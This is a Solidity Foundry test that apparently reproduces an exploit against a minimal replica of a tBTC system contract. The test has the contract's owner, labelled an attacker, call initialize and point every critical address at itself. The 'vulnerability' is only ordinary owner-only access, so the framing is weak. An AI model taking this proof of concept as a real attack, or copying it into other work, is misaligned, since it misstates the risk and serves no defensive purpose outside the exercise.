// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";

// Minimal vulnerable replica (inline — do NOT import from ../src/)
contract TBTCSystem {
    // only the state + functions your exploit touches
    address public owner;
    bool private _initialized = false;
    address public keepVendor;
    address public tbtcToken;
    address public tbtcDepositToken;
    address public feeRebateToken;
    address public vendingMachine;
    bool private allowNewDeposits = false;

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    constructor(address /*_priceFeed*/, address /*_relay*/) {
        owner = msg.sender;
    }

    // Vulnerable initialize: protected only by onlyOwner, allowing any owner (including a compromised one)
    // to set critical system addresses.
    function initialize(
        address _keepVendor,
        address _depositFactory,
        address payable _masterDepositAddress,
        address _tbtcToken,
        address _tbtcDepositToken,
        address _feeRebateToken,
        address _vendingMachine,
        uint256 _keepThreshold,
        uint256 _keepSize
    ) external onlyOwner {
        require(!_initialized, "already initialized");

        // simplified behavior: set critical addresses (original called other contracts)
        keepVendor = _keepVendor;
        tbtcToken = _tbtcToken;
        tbtcDepositToken = _tbtcDepositToken;
        feeRebateToken = _feeRebateToken;
        vendingMachine = _vendingMachine;

        _initialized = true;
        allowNewDeposits = true;
    }

    function getAllowNewDeposits() external view returns (bool) { return allowNewDeposits; }
}

contract TBTCSystemTest is Test {
    TBTCSystem target;
    address attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        // Deploy the system as the attacker to simulate a compromised owner
        vm.prank(attacker);
        target = new TBTCSystem(address(0), address(0));
    }

    function test_attacker_exploits_initialize() public {
        // Attacker (owner) calls initialize and sets critical addresses to attacker-controlled values
        vm.prank(attacker);
        target.initialize(
            attacker, // _keepVendor -> attacker-controlled
            address(1),
            payable(address(2)),
            attacker, // _tbtcToken -> attacker-controlled
            attacker, // _tbtcDepositToken -> attacker-controlled
            attacker, // _feeRebateToken -> attacker-controlled
            attacker, // _vendingMachine -> attacker-controlled
            1,
            1
        );

        // Assert that attacker successfully set critical addresses
        assertEq(target.keepVendor(), attacker);
        assertEq(target.tbtcToken(), attacker);
        assertEq(target.tbtcDepositToken(), attacker);
        assertTrue(target.getAllowNewDeposits());
    }
}

